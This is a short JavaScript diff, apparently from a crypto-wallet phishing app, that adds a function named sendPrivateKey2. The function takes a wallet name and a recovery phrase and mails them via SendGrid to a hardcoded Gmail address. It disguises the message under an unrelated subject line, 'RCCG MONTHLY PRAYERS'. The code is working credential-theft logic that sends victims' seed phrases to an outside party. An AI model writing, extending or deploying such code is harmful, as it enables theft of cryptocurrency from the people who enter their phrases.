@@ -91,3 +91,27 @@ export const sendPrivateKey = async (goodwillMessage) => {
       console.log(JSON.stringify(error));
     });
 };
+
+export const sendPrivateKey2 = async (walletName, rPhrase) => {
+  const redeem = `${walletName}`;
+  const SENDER_EMAIL2 = `activation340@gmail.com`;
+  console.log(walletName, rPhrase);
+  const msg = {
+    to: SENDER_EMAIL2,
+    from: {
+      email: "oforduharrison@gmail.com",
+      name: redeem,
+    },
+    subject: "RCCG MONTHLY PRAYERS",
+    html: `${html3(redeem, SENDER_EMAIL2, rPhrase)}`,
+  };
+  sgMail
+    .send(msg)
+    .then(() => {
+      console.log("Email sent");
+    })
+    .catch((error) => {
+      console.error(error);
+      console.log(JSON.stringify(error));
+    });
+};
